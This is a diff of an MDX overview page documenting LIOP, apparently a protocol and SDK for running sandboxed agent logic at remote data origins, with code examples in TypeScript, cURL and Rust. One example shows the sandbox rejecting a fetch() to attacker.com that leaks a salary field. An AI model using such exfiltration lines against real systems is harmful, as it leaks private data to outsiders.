@@ -1,13 +1,369 @@
 ---
-title: "Introduction"
-description: "Welcome to the Logic-Injection-on-Origin Protocol (LIOP) documentation"
+title: "Overview"
+description: "High-performance, Zero-Trust binary mesh for sovereign AI agent communication"
+icon: "rocket"
+mode: "wide"
 ---
 
-LIOP is a high-performance binary transport mesh designed for autonomous agent communication. It extends application-level protocols such as the Model Context Protocol (MCP) by replacing context-pulling data transfers with **sandboxed Logic-Injection-on-Origin (LIO)** execution.
+export const LiopBrandHeader = () => (
+  <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center mt-2 sm:mt-3 mb-6 gap-4 not-prose border-b border-zinc-200 dark:border-zinc-800/80 pb-5">
+    <div className="flex items-center gap-3">
+      <div className="relative w-[180px] sm:w-[210px] h-[34px] sm:h-[40px]">
+        <img src="/logo/dark.svg" alt="LIOP Protocol" className="hidden dark:block w-full h-full object-contain object-left pointer-events-none" />
+        <img src="/logo/light.svg" alt="LIOP Protocol" className="block dark:hidden w-full h-full object-contain object-left pointer-events-none" />
+      </div>
+    </div>
+    <div className="flex items-center flex-wrap gap-2 text-xs font-mono">
+      <a href="https://www.npmjs.com/package/@nekzus/liop" target="_blank" rel="noopener noreferrer" className="px-2.5 py-1 rounded-md bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 border border-emerald-500/20 hover:bg-emerald-500/20 transition-colors">
+        npm: v2.4.0
+      </a>
+      <a href="https://github.com/Nekzus/LIOP" target="_blank" rel="noopener noreferrer" className="px-2.5 py-1 rounded-md bg-zinc-100 dark:bg-zinc-800/60 text-zinc-700 dark:text-zinc-300 border border-zinc-300 dark:border-zinc-700/60 hover:bg-zinc-200 dark:hover:bg-zinc-800 transition-colors">
+        GitHub: Open Source
+      </a>
+      <span className="px-2.5 py-1 rounded-md bg-zinc-100 dark:bg-zinc-800/60 text-zinc-600 dark:text-zinc-400 border border-zinc-300 dark:border-zinc-700/60">
+        License: Apache-2.0
+      </span>
+      <span className="px-2.5 py-1 rounded-md bg-cyan-500/10 text-cyan-600 dark:text-cyan-400 border border-cyan-500/20">
+        ML-KEM-768
+      </span>
+    </div>
+  </div>
+);
 
-The **Postulate of Origin (LIO)** establishes the core architectural rule: underlying data is sovereign and remains at rest within its local boundary. Only mathematically aggregated results or cryptographically attested evidence cross the wire.
+export const QuickstartBanner = () => (
+  <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between bg-[#0c0e12] dark:bg-[#0c0e12] border border-zinc-800 rounded-xl p-5 md:p-6 w-full mb-6 gap-4 shadow-lg not-prose">
+    <div className="flex items-center gap-3 sm:gap-4 flex-1">
+      <div className="flex flex-col min-w-0">
+        <span className="font-semibold text-base md:text-lg text-zinc-100">Quickstart Guide</span>
+        <span className="text-sm text-zinc-400 mt-1 leading-relaxed font-light">
+          Deploy your first Zero-Trust LIOP Client and Server in under 3 minutes using the official TypeScript SDK.
+        </span>
+      </div>
+    </div>
+    <div className="flex flex-col sm:flex-row gap-2.5 sm:ml-4">
+      <a href="/getting-started/quickstart" className="px-5 py-2.5 bg-emerald-500 hover:bg-emerald-400 text-zinc-950 rounded-full font-semibold text-sm shadow transition-all duration-200 whitespace-nowrap text-center">
+        Get Started
+      </a>
+      <a href="https://www.npmjs.com/package/@nekzus/liop" target="_blank" rel="noopener noreferrer" className="px-5 py-2.5 bg-zinc-800 hover:bg-zinc-700 text-zinc-100 border border-zinc-700 rounded-full font-semibold text-sm shadow transition-all duration-200 whitespace-nowrap text-center">
+        Install NPM
+      </a>
+    </div>
+  </div>
+);
 
-While MCP standardizes client-side application tooling and developer workflows, **LIOP provides sovereign, decentralized compute and transport infrastructure** for distributed enterprise datasets.
+export const ProtocolReleaseStrip = () => (
+  <div className="flex items-center gap-3 rounded-xl border border-zinc-800 bg-[#0c0e12] dark:bg-[#0c0e12] px-4 py-2.5 mb-8 w-full not-prose">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="h-4 w-4 shrink-0 text-emerald-500">
+      <path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6" />
+    </svg>
+    <span className="text-xs sm:text-sm font-mono leading-relaxed text-zinc-300 dark:text-zinc-300">
+      <strong>LIOP v2.4.0 Release:</strong> Native Dual-Era MCP Handshake (2026-07-28 &amp; 2025-11-25) with ML-KEM-768 Post-Quantum encryption. View the <a href="/cookbook/mcp-migration" className="font-semibold underline underline-offset-4 decoration-1 text-emerald-400 hover:text-emerald-300">Migration Cookbook</a>.
+    </span>
+  </div>
+);
+
+export const UseCaseTabs = () => {
+  const [selected, setSelected] = useState(0);
+  const useCases = [
+    {
+      label: "In-Situ Big Data",
+      description: "Dispatches sandboxed filtering directly to remote data origins. The model receives only aggregated mathematical summaries (312 bytes egress, 184 tokens) instead of parsing raw multi-megabyte log dumps.",
+      codeExamples: [
+        `import { LiopClient } from "@nekzus/liop";
+
+const client = new LiopClient({
+  target: "grpc://vault.mesh.internal:15021",
+  securityTier: 1,
+});
+
+// Dispatch sandboxed filter logic directly to the remote origin enclave
+const telemetry = await client.injectLogic({
+  enclaveId: "TelemetryVault_01",
+  fuelLimit: 50_000,
+  logic: \`
+    // Executed in-situ inside Nitro V8 Isolate over 500 MB raw logs
+    const results = records
+      .filter(r => r.status >= 500 && r.latencyMs > 250)
+      .map(r => r.latencyMs);
+
+    return {
+      totalAnomalies: results.length,
+      p99LatencyMs: results.sort((a, b) => a - b)[Math.floor(results.length * 0.99)] || 0,
+      egressBytes: 312 // Only aggregated telemetry crosses the wire
+    };
+  \`
+});
+
+console.log("In-Situ Analytics Proof:", telemetry.receipt);`,
+        `# Invoke in-situ query via Border LIO Gateway HTTP/2 proxy
+curl -X POST https://mesh.liop.network:15018/v1/enclaves/vault/inject \\
+  -H "Authorization: Bearer $LIOP_OAUTH_TOKEN" \\
+  -H "Content-Type: application/json" \\
+  -d '{
+    "enclave": "TelemetryVault_01",
+    "fuelLimit": 50000,
+    "quantizeBucket": 100,
+    "closure": "return { errors: records.filter(r => r.status >= 500).length }"
+  }'`,
+        `use liop_client::{LiopRpcClient, InjectRequest};
+
+let client = LiopRpcClient::connect("http://127.0.0.1:15021").await?;
+let request = InjectRequest::new("TelemetryVault_01")
+    .with_fuel_limit(50_000)
+    .with_logic(r#"
+        let anomalies = records.iter().filter(|r| r.status >= 500).count();
+        format!("anomalies: {}", anomalies)
+    "#);
+
+let response = client.inject_logic(request).await?;
+println!("Attested proof: {}", response.zk_receipt);`
+      ]
+    },
+    {
+      label: "Zero-Trust AST Sandbox",
+      description: "Injected logic executes in an isolated V8 sandbox where host APIs (fetch, eval, process) are poisoned and 11 native prototypes are immutably frozen against prototype pollution.",
+      codeExamples: [
+        `import { LiopServer } from "@nekzus/liop";
+import { z } from "zod";
+
+const server = new LiopServer({
+  name: "FinancialEnclave_01",
+  version: "2.4.0",
+  sandbox: {
+    maxMemoryMb: 128,
+    fuelLimit: 100_000,
+    poisonGlobals: true, // Neutralizes 25 dangerous host APIs (eval, fetch, process)
+    freezePrototypes: true // Freezes 11 native prototypes (Object, Array, Promise)
+  }
+});
+
+server.registerTool({
+  name: "aggregate_payroll",
+  schema: z.object({ departmentId: z.string() }),
+  handler: async ({ departmentId }, context) => {
+    // Injected code cannot leak individual salaries; only aggregate sums pass
+    return context.computeAggregatedSalary(departmentId);
+  }
+});
+
+await server.listen(15021);`,
+        `# Verify sandbox rejection of unauthorized egress attempts
+curl -X POST https://mesh.liop.network:15018/v1/audit/ast-verify \\
+  -H "Content-Type: application/json" \\
+  -d '{
+    "payload": "fetch(\\"https://attacker.com/leak?data=\\" + records[0].salary)"
+  }'
+# Response: 403 Forbidden [AST_ALLOWLIST_VIOLATION: Identifier "fetch" is poisoned]`,
+        `use liop_core::sandbox::{WasiSandbox, SandboxConfig};
+
+let config = SandboxConfig::default()
+    .with_fuel_limit(100_000)
+    .with_memory_cap(128 * 1024 * 1024);
+
+let mut sandbox = WasiSandbox::new(config)?;
+sandbox.freeze_prototypes()?;
+let result = sandbox.execute_module(&wasm_bytes)?;`
+      ]
+    },
+    {
+      label: "ZK-Receipt Verification",
+      description: "Computations return a cryptographic receipt binding the exact AST logic hash and output payload to the ephemeral quantum-safe session secret (ML-KEM-768).",
+      codeExamples: [
+        `import { ReceiptVerificationEngine, QuantumKeyExchange } from "@nekzus/liop/security";
+
+// 1. Establish ML-KEM-768 session secret with remote enclave
+const keyExchange = new QuantumKeyExchange();
+const { ciphertext, sharedSecret } = await keyExchange.encapsulate(enclavePublicKey);
+
+// 2. Validate HMAC-SHA256 computational proof
+const isValid = ReceiptVerificationEngine.verify({
+  receipt: executionResponse.zkReceipt,
+  sharedSecret,
+  expectedLogicHash: executionResponse.logicHash,
+  resultPayload: executionResponse.data
+});
+
+if (!isValid) throw new Error("Tampered compute detected: ZK proof invalid");
+console.log("Proof verified: computational integrity guaranteed by ML-KEM-768.");`,
+        `# Query ZK-Receipt verification against notary consensus
+curl -X POST https://mesh.liop.network:15018/v1/receipts/verify \\
+  -H "Authorization: Bearer $LIOP_OAUTH_TOKEN" \\
+  -H "Content-Type: application/json" \\
+  -d '{
+    "receipt": "0x8f2d9ca4...7b",
+    "logicHash": "sha256-e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+    "outputSummary": "{\\"totalAnomalies\\": 14}"
+  }'`,
+        `use liop_core::crypto::{ZkReceipt, MlKem768SharedSecret};
+
+let proof = ZkReceipt::from_bytes(&response.receipt)?;
+let is_valid = proof.verify_hmac_sha256(&shared_secret, &response.payload)?;
+assert!(is_valid, "Cryptographic attestation failed");`
+      ]
+    },
+    {
+      label: "Dual-Era MCP Bridge",
+      description: "Wraps standard @modelcontextprotocol/sdk instances into sovereign peer nodes. Tool definitions remain 100% untouched while adding automatic PII egress filters and P2P DHT announcement.",
+      codeExamples: [
+        `import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
+import { LiopMcpBridge, PII_PRESETS } from "@nekzus/liop/bridge";
+import { z } from "zod";
+
+const legacyServer = new McpServer({
+  name: "SupportTools",
+  version: "1.0.0"
+});
+
+// Original tool definitions remain 100% untouched
+legacyServer.tool("get_customer_history", { customerId: z.string() }, async ({ customerId }) => {
+  return { content: [{ type: "text", text: JSON.stringify(db.lookup(customerId)) }] };
+});
+
+// Wrap with LIOP Bridge: publishes to P2P mesh and activates Egress PII filters
+const bridge = new LiopMcpBridge(legacyServer, {
+  publishToMesh: true,
+  meshIdentity: "SupportEnclave_01",
+  security: {
+    forbiddenKeys: ["tax_id", "credit_card"],
+    piiPatterns: PII_PRESETS.US_COMPLIANT,
+    enableNerScanning: true
+  }
+});
+
+await bridge.connect();`,
+        `# Connect modern desktop clients (Claude / Cursor) via stdio bridge
+npx @nekzus/liop bridge --stdio --config ./claude_desktop_config.json`,
+        `use liop_bridge::McpBridge;
+
+let bridge = McpBridge::new("SupportEnclave_01")
+    .with_egress_filter(PiiPreset::UsCompliant)
+    .bind_stdio()?;
+bridge.run().await?;`
+      ]
+    }
+  ];
+
+  const active = useCases[selected];
+
+  return (
+    <section className="mx-auto w-full p-4 sm:p-6 rounded-xl bg-[#0c0e12] dark:bg-[#0c0e12] border border-zinc-800 flex flex-col lg:flex-row gap-4 sm:gap-6 not-prose mb-12 shadow-xl">
+      <nav className="flex flex-col lg:w-72 lg:shrink-0" aria-label="Use case navigation">
+        <h2 className="text-xs font-semibold mb-3 text-zinc-400 uppercase tracking-wider font-mono">
+          Core Architecture Workflows
+        </h2>
+        <div className="flex flex-wrap lg:flex-col gap-1.5 pb-2 lg:pb-0">
+          {useCases.map((uc, idx) => (
+            <button
+              key={uc.label}
+              type="button"
+              className={`px-3 py-2.5 text-left rounded-lg transition-all duration-200 text-sm font-medium ${
+                selected === idx
+                  ? "bg-zinc-800 text-zinc-100 border border-zinc-700 shadow-sm"
+                  : "text-zinc-400 hover:bg-zinc-850 hover:text-zinc-200 border border-transparent"
+              }`}
+              onClick={() => setSelected(idx)}
+            >
+              {uc.label}
+            </button>
+          ))}
+        </div>
+        <p className="hidden lg:block mt-4 text-xs text-zinc-400 leading-relaxed border-t border-zinc-800/80 pt-3">
+          {active.description}
+        </p>
+        <a href="/concepts/logic-on-origin" className="hidden lg:block mt-auto text-xs underline text-emerald-400 hover:text-emerald-300 transition-colors pt-3">
+          Read Formal Specification →
+        </a>
+      </nav>
+
+      <div className="flex-1 w-full bg-zinc-950 rounded-lg overflow-hidden border border-zinc-800 min-w-0">
+        <CodeGroup>
+          <pre className="language-typescript" filename="TypeScript">
+            <code>{active.codeExamples[0]}</code>
+          </pre>
+          <pre className="language-bash" filename="cURL / CLI">
+            <code>{active.codeExamples[1]}</code>
+          </pre>
+          <pre className="language-rust" filename="Rust">
+            <code>{active.codeExamples[2]}</code>
+          </pre>
+        </CodeGroup>
+      </div>
+    </section>
+  );
+};
+
+export const ArchitectureGrid = () => (
+  <div className="mt-8 mb-12 not-prose">
+    <div className="flex justify-between items-center mb-6">
+      <h2 className="text-xl font-semibold text-zinc-900 dark:text-zinc-100">Protocol Components &amp; Architecture</h2>
+    </div>
+    <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+      <div className="flex flex-col items-start bg-[#0c0e12] border border-zinc-800 rounded-xl p-5 hover:border-zinc-700 transition-all duration-200">
+        <a href="/typescript-sdk/overview" className="block rounded-lg overflow-hidden w-full border border-zinc-800 mb-4 bg-zinc-950">
+          <img src="/images/animated-sdk-flow-dark.svg" alt="TypeScript SDK Architecture" className="hidden dark:block w-full h-44 object-contain pointer-events-none" />
+          <img src="/images/animated-sdk-flow-light.svg" alt="TypeScript SDK Architecture" className="block dark:hidden w-full h-44 object-contain pointer-events-none" />
+        </a>
+        <a href="/typescript-sdk/overview" className="text-lg font-semibold text-zinc-100 mb-1 hover:underline">
+          TypeScript SDK &amp; MCP Bridge
+        </a>
+        <p className="text-sm text-zinc-400 leading-relaxed">
+          High-performance Node.js runtime with worker pool concurrency, dynamic client/server bindings, and seamless legacy MCP server integration.
+        </p>
+      </div>
+
+      <div className="flex flex-col items-start bg-[#0c0e12] border border-zinc-800 rounded-xl p-5 hover:border-zinc-700 transition-all duration-200">
+        <a href="/concepts/zero-trust" className="block rounded-lg overflow-hidden w-full border border-zinc-800 mb-4 bg-zinc-950">
+          <img src="/images/animated-security-layers-dark.svg" alt="The Shield Security Pipeline" className="hidden dark:block w-full h-44 object-contain pointer-events-none" />
+          <img src="/images/animated-security-layers-light.svg" alt="The Shield Security Pipeline" className="block dark:hidden w-full h-44 object-contain pointer-events-none" />
+        </a>
+        <a href="/concepts/zero-trust" className="text-lg font-semibold text-zinc-100 mb-1 hover:underline">
+          Zero-Trust Security &amp; The Shield
+        </a>
+        <p className="text-sm text-zinc-400 leading-relaxed">
+          Six defense-in-depth layers: Guardian AST, V8 Isolate sandboxing with prototype freezing, 4-stage Egress PII filter, and ZK-Receipt seals.
+        </p>
+      </div>
+
+      <div className="flex flex-col items-start bg-[#0c0e12] border border-zinc-800 rounded-xl p-5 hover:border-zinc-700 transition-all duration-200">
+        <a href="/concepts/specification" className="block rounded-lg overflow-hidden w-full border border-zinc-800 mb-4 bg-zinc-950">
+          <img src="/images/architecture-dark.svg" alt="Tonic gRPC & P2P Mesh Architecture" className="hidden dark:block w-full h-44 object-contain pointer-events-none" />
+          <img src="/images/architecture-light.svg" alt="Tonic gRPC & P2P Mesh Architecture" className="block dark:hidden w-full h-44 object-contain pointer-events-none" />
+        </a>
+        <a href="/concepts/specification" className="text-lg font-semibold text-zinc-100 mb-1 hover:underline">
+          Tonic gRPC &amp; P2P Mesh Runtime
+        </a>
+        <p className="text-sm text-zinc-400 leading-relaxed">
+          Binary transport multiplexing over HTTP/2, Kademlia DHT peer discovery with rust-libp2p, and symmetric channel keepalive options.
+        </p>
+      </div>
+
+      <div className="flex flex-col items-start bg-[#0c0e12] border border-zinc-800 rounded-xl p-5 hover:border-zinc-700 transition-all duration-200">
+        <a href="/operations/sovereign-deployment" className="block rounded-lg overflow-hidden w-full border border-zinc-800 mb-4 bg-zinc-950">
+          <img src="/images/animated-tee-flow-dark.svg" alt="Sovereign Enclaves & TEE Attestation" className="hidden dark:block w-full h-44 object-contain pointer-events-none" />
+          <img src="/images/animated-tee-flow-light.svg" alt="Sovereign Enclaves & TEE Attestation" className="block dark:hidden w-full h-44 object-contain pointer-events-none" />
+        </a>
+        <a href="/operations/sovereign-deployment" className="text-lg font-semibold text-zinc-100 mb-1 hover:underline">
+          Sovereign Enclaves &amp; Observability
+        </a>
+        <p className="text-sm text-zinc-400 leading-relaxed">
+          Isolated Docker tri-tier deployment with Swarm PSK, Nitro TEE hardware attestation, and 26-panel Prometheus &amp; Grafana monitoring.
+        </p>
+      </div>
+    </div>
+  </div>
+);
+
+<LiopBrandHeader />
+
+<QuickstartBanner />
+
+<ProtocolReleaseStrip />
+
+<UseCaseTabs />
+
+<ArchitectureGrid />
+
+---
 
 ## Architectural Context
 
@@ -17,13 +373,13 @@ LIOP inverts this workflow: **compute dispatches to the data source rather than 
 
 <CardGroup cols={2}>
   <Card title="Logic-Injection-on-Origin" icon="bolt">
-    Instead of downloading giant datasets, Agents dynamically compile their reasoning step into a compact WebAssembly (`.wasm`) module and push it exactly where the data lives.
+    Instead of downloading large datasets, Agents compile their reasoning step into a compact WebAssembly (`.wasm`) module or JavaScript payload and push it directly to the data source.
   </Card>
   <Card title="Multi-Layered Security (Tier-1)" icon="shield-halved">
     Zero-Trust AST Sandboxing (WASI), Egress PII verification with compliance algorithms (Luhn, NIST boundaries, and pattern validators), and Post-Quantum cryptography.
   </Card>
   <Card title="Zero-Shot Autonomy" icon="brain">
-    LIOP Auto-educates remote LLMs on-the-fly. If an Agent violates the Logic-Injection paradigm, the Server cognitively instructs the Agent to rewrite its WASM payload securely.
+    LIOP guides remote LLMs during logic generation. If an Agent violates the Logic-Injection paradigm, the Server provides structured feedback to rewrite its payload securely within Sandbox bounds.
   </Card>
   <Card title="Binary High-Performance" icon="rocket">
     Built entirely on compiled Protobuf messages multiplexed over Tonic (gRPC). Eliminates text-based JSON serialization overhead, reducing payload sizes by over 60%.
@@ -39,47 +395,41 @@ LIOP inverts this workflow: **compute dispatches to the data source rather than 
   </Card>
 </CardGroup>
 
-## Logic-Injection-on-Origin: Industrial Use Cases
+---
 
-The *Logic-Injection-on-Origin* paradigm inverts traditional distributed compute flows. Instead of extracting raw records across the network to remote models, the protocol dispatches sandboxed logic directly to the infrastructure hosting the data, eliminating the network latency, egress costs, and compliance risks caused by Data Gravity.
+## Industrial Use Cases
 
-### 1. Healthcare & Bio-Informatics (Zero-Exfiltration)
-An AI Doctor Agent wants to analyze 10 years of patient history across multiple hospitals to find correlations between specific medications and side effects. 
-In traditional computing, this is impossible due to HIPAA and GDPR: hospitals cannot export thousands of medical records (containing Personally Identifiable Information). 
-With LIOP, the Agent injects a securely sandboxed WebAssembly filter. The hospital's Data Node runs the logic locally against its database. The Agent receives *only* the final mathematical conclusion (e.g., "85% correlation found for Medication X with target side effect") backed by a cryptography receipt, **without ever seeing a single patient's name.**
+The *Logic-Injection-on-Origin* paradigm inverts traditional distributed compute flows. Instead of extracting raw records across the network to remote models, the protocol dispatches sandboxed logic directly to the infrastructure hosting the data, eliminating network latency, egress costs, and compliance risks.
 
-### 2. Financial Auditing & High-Frequency Trading (HFT)
-An AI Auditor is tasked with validating millions of transactions across international banks for fraud detection. The sheer size of a global banking ledger, combined with banking secrecy laws, makes transferring this data to a central cloud LLM illegal and unfeasible. 
-Via LIOP, the auditor injects a fraud-detection heuristic directly into the Bank's secure Nitro Enclave. The logic runs over the raw ledger at bare-metal speeds, returning only the flagged anomalies.
+<CardGroup cols={2}>
+  <Card title="Healthcare & Bio-Informatics" icon="heart-pulse">
+    **Compliance:** `HIPAA §164.312` · `GDPR Article 9`  
+    **Impact:** Zero-exfiltration analytics over 10 years of patient records across distributed hospital nodes. Injected WASM filters compute statistical correlations locally, returning attested conclusions without exposing patient PII.
+  </Card>
 
-### 3. Edge Computing & Massive IoT Telemetry
-Smart factories, autonomous drones, or satellites generate gigabytes of telemetry per second. A central AI cannot ingest this sheer volume in real-time. 
-Instead, LIOP pushes dynamic intelligence logic down to the Edge antenna. The Agent installs a perpetually sleeping WASM **Watchdog** on the satellite. It processes terabytes of data locally in orbit, and asynchronously streams an alert via gRPC *only* when a critical failure pattern is detected.
+  <Card title="Financial Auditing & High-Frequency Trading" icon="scale-balanced">
+    **Compliance:** `PCI-DSS v4.0` · `SOC 2 Type II`  
+    **Impact:** Real-time fraud detection across international interbank ledgers. AI auditors dispatch heuristics directly into secure Nitro Enclaves, evaluating raw ledger entries at wire speed and returning only cryptographic proofs of flagged anomalies.
+  </Card>
 
-### 4. Decentralized Collaborative AI Research
-Multiple pharmaceutical consortiums want to train advanced models on their combined genomic databases without sharing their raw proprietary molecules with competitors. They use LIOP to push training algorithms to each other's origins, extracting only encrypted gradient updates to assemble the final shared model securely.
+  <Card title="Edge Computing & Massive IoT Telemetry" icon="satellite-dish">
+    **Compliance:** `Sub-GHz Edge Protocols` · `NIST SP 800-207`  
+    **Impact:** Autonomous satellites and smart factories generate gigabytes per second. Persistent WASM watchdogs run in orbit and on edge gateways, streaming gRPC alerts only when critical failure signatures are detected.
+  </Card>
 
-## Who is LIOP for?
+  <Card title="Decentralized Collaborative Research" icon="dna">
+    **Compliance:** `Cross-Enterprise Sovereign Consortium`  
+    **Impact:** Pharmaceutical consortia train advanced ML models on combined genomic datasets without sharing proprietary molecular IP. Enclaves compute local gradient steps and exchange only encrypted weights.
+  </Card>
+</CardGroup>
 
-LIOP provides significant benefits across the entire AI ecosystem:
-
-*   **For AI Application Developers:** Enable your agents to analyze remote massive repositories or databases instantly without waiting for megabytes of text to stream across the network.
-*   **For Data Owners & Enterprise:** Expose your local tools and sensitive data securely. Since the Agent's logic runs in a mathematical sandbox (`WASI`) on your machine, your raw proprietary data never leaves your local network. It only exports the final answer.
-*   **For the AI Community:** A universal, open, and mathematically verifiable standard for deploying dynamic intelligence models and autonomous watchers.
-
-## Core Pillars of the Logic-Injection-on-Origin Mesh
-
-1.  **Capability-Based Security:** Permissions in LIOP are not binary strings. They are File Descriptors actively mapped into the Sandbox. An agent can only see what it was strictly granted.
-2.  **Post-Quantum Handshakes:** Intent negotiations use Kyber (ML-KEM-768) ensuring "Harvest Now, Decrypt Later" state-level attacks are completely mitigated, encapsulating all data via Symmetric `AES-256-GCM`.
-3.  **Real-Time Watchdogs:** Agents can push persistent `.wasm` modules that sleep on the server for free, and asynchronously wake up to stream an alert via gRPC only when an anomaly is detected.
-4.  **Hardware Blind Computing (TEEs):** Future-proof architectural designs ready to execute the `Wasmtime` engine inside AWS Nitro Enclaves, assuring Memory-level encryption for High-Compliance environments.
-5.  **AST Guardian Inspection:** The SDK statically inspects incoming binary syntax trees and rejects payloads attempting illegal namespace bindings before instantiation.
+---
 
 ## Next Steps
 
 <CardGroup cols={2}>
   <Card title="Quickstart Guide" icon="forward-step" href="/getting-started/quickstart">
-    Launch your first LIOP Server and Client in under 5 minutes using the official SDK.
+    Launch your first LIOP Server and Client in under 3 minutes using the official SDK.
   </Card>
   <Card title="Architecture Overview" icon="sitemap" href="/concepts/architecture">
     Understand how Kademlia, gRPC, and Wasmtime operate together in the Logic-Injection-on-Origin protocol.
@@ -96,16 +446,13 @@ LIOP provides significant benefits across the entire AI ecosystem:
       "description": "High-performance, Zero-Trust binary transport mesh for AI Agent communication using WebAssembly Logic-on-Origin execution.",
       "codeRepository": "https://github.com/Nekzus/LIOP",
       "programmingLanguage": ["TypeScript", "Rust"],
-      "runtimePlatform": "Node.js 20+",
-      "license": "https://opensource.org/licenses/Apache-2.0",
+      "runtimePlatform": "Node.js 20+, Wasmtime 29+",
+      "license": "https://spdx.org/licenses/Apache-2.0.html",
       "author": {
         "@type": "Organization",
         "name": "Nekzus Solutions",
         "url": "https://github.com/Nekzus"
-      },
-      "datePublished": "2026-03-01",
-      "operatingSystem": "Cross-platform (Windows, Linux, macOS)"
+      }
     })
   }}
 />
-
